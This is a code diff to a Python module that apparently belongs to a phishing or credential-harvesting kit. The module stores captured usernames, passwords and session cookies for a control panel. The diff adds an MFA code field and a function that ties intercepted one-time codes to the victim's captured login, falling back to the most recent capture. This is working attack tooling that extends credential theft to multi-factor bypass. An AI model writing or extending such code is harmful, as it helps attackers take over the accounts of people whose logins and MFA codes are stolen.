@@ -9,6 +9,7 @@ class CapturedCredential:
     n_captures: int = 1
     last_captured_at: datetime = field(default_factory=lambda: datetime.now(tz=UTC))
     session_cookie: str | None = None
+    mfa_code: str | None = None
 
     def to_payload(self) -> dict[str, str | int | None]:
         """Serialize to the shape consumed by the control panel UI."""
@@ -18,6 +19,7 @@ class CapturedCredential:
             "nCaptures": self.n_captures,
             "lastCapturedAt": self.last_captured_at.isoformat(),
             "sessionCookie": self.session_cookie,
+            "mfaCode": self.mfa_code,
         }
 
 
@@ -33,6 +35,23 @@ def capture_credential(username: str, password: str) -> CapturedCredential:
 
     credential = CapturedCredential(username=username, password=password)
     captured_credentials.append(credential)
+    return credential
+
+
+def capture_mfa_code(username: str, mfa_code: str) -> CapturedCredential | None:
+    # The MFA form carries the username, so associate by it; fall back to the
+    # most recent capture if the password step somehow slipped past us.
+    for credential in reversed(captured_credentials):
+        if credential.username == username:
+            credential.mfa_code = mfa_code
+            credential.last_captured_at = datetime.now(tz=UTC)
+            return credential
+
+    if not captured_credentials:
+        return None
+    credential = captured_credentials[-1]
+    credential.mfa_code = mfa_code
+    credential.last_captured_at = datetime.now(tz=UTC)
     return credential
 
 
